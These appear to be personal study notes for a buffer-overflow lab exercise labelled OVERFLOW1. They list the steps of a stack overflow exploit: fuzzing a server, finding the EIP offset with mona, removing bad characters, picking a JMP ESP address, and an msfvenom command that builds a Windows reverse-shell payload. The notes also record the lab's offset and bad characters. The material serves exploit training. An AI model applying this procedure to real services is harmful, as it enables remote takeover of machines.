Step 1: implement fuzzer to crash out the server
Step 2: after crashing, implement exploit.py file
        we got to control EIP register
        generate payload: number of "A" that crashed out the server + 400, use metasploit-framework/tools/exploit/patter_create.rb -l <length>
Step 3: run server, run exploit, type !mona findmsp -distance <length>
        look for EIP register, what is the offset?
Step 4: edit exploit.py: return address to "BBBB"
Step 5: find bad characters: generate bytearray with !mona bytearray -b "\x00"
        generate bytearray with python script, the output will be the payload in the exploit.py scipt
        run server, run exploit.py, check ESP register address
        run !mona compare -f <mona generated bytearray file> -a <esp addr>
        check immunitydebugger output, look for bad chars, only remove badchars from payload and mona bytearray one by one
        do this until immunity says unmodified
Step 6: run server, run exploit, !mona jmp -r esp -cpb <bad chars "\x00...">
        immunity lists out a bunch of addresses, pick one
        edit exploit.py return address with this addtess
Step 7: generate payload with mfsvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=444 EXITFUNC=thread -b <badchars "\x00..." -f c

OVERFLOW1 notice: EIP offset is 1978, bad chars are \x00\x07\x2e\xa0
